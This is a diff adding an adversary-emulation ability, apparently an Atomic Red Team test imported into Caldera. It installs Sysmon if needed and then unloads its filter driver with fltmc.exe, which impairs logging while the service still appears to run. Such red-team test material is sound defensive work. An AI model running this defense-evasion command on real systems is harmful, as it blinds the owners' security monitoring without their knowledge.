@@ -1,0 +1,97 @@
+- id: 811b3e76-c41b-430c-ac0d-e2380bfaa164
+  name: Unload Sysmon Filter Driver
+  description: 'Unloads the Sysinternals Sysmon filter driver without stopping the
+    Sysmon service. To verify successful execution,
+
+    run the prereq_command''s and it should fail with an error of "sysmon filter must
+    be loaded".'
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.001
+    name: 'Impair Defenses: Disable or Modify Tools'
+  platforms:
+    windows:
+      sh:
+        command: 'if ((cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr /i Sysmon
+          2> nul") -or (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"))
+          { exit 0 } else { exit 1 }; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip"; Expand-Archive
+          "PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip" "PathToAtomicsFolder\..\ExternalPayloads\Sysmon"
+          -Force; fi; if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit
+          1 }; then : ; else if(cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr
+          Sysmon 2> nul") { C:\Windows\Sysmon.exe -accepteula -i } else; { & "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"
+          -accepteula -i}; fi; if(fltmc.exe filters | findstr SysmonDrv) { exit 0
+          } else { exit 1 }; then : ; else if(Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"){;
+          & "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -u; & "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"
+          -accepteula -i; }else{; sysmon -u; sysmon -accepteula -i; }; fi; fltmc.exe
+          unload SysmonDrv'
+        cleanup: sysmon -u -i > nul 2>&1; sysmon -i -accepteula -i > nul 2>&1; "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"
+          -u > nul 2>&1; "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"
+          -accepteula -i > nul 2>&1
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1562.001
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      sysmon_driver:
+        description: The name of the Sysmon filter driver (this can change from the
+          default)
+        type: string
+        default: SysmonDrv
+    dependencies:
+    - description: 'Sysmon must be downloaded
+
+        '
+      prereq_command: 'if ((cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr /i Sysmon
+        2> nul") -or (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"))
+        { exit 0 } else { exit 1 }
+
+        '
+      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+        -ErrorAction Ignore -Force | Out-Null
+
+        Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile
+        "PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip"
+
+        Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip" "PathToAtomicsFolder\..\ExternalPayloads\Sysmon"
+        -Force
+
+        '
+    - description: 'sysmon must be Installed
+
+        '
+      prereq_command: 'if(sc.exe query sysmon | findstr sysmon) { exit 0 } else {
+        exit 1 }
+
+        '
+      get_prereq_command: 'if(cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon
+        2> nul") { C:\Windows\Sysmon.exe -accepteula -i } else
+
+        { & "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -accepteula
+        -i}
+
+        '
+    - description: 'sysmon filter must be loaded
+
+        '
+      prereq_command: 'if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0 }
+        else { exit 1 }
+
+        '
+      get_prereq_command: "if(Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\\
+        Sysmon\\Sysmon.exe\"){\n  & \"PathToAtomicsFolder\\..\\ExternalPayloads\\\
+        Sysmon\\Sysmon.exe\" -u\n  & \"PathToAtomicsFolder\\..\\ExternalPayloads\\\
+        Sysmon\\Sysmon.exe\" -accepteula -i\n}else{\n  sysmon -u\n  sysmon -accepteula\
+        \ -i\n}\n"
+    technique_created: '2020-02-21T20:32:20.810Z'
+    atomic_guid: 811b3e76-c41b-430c-ac0d-e2380bfaa164
+    import_timestamp: '2025-06-24T11:15:01.002445Z'
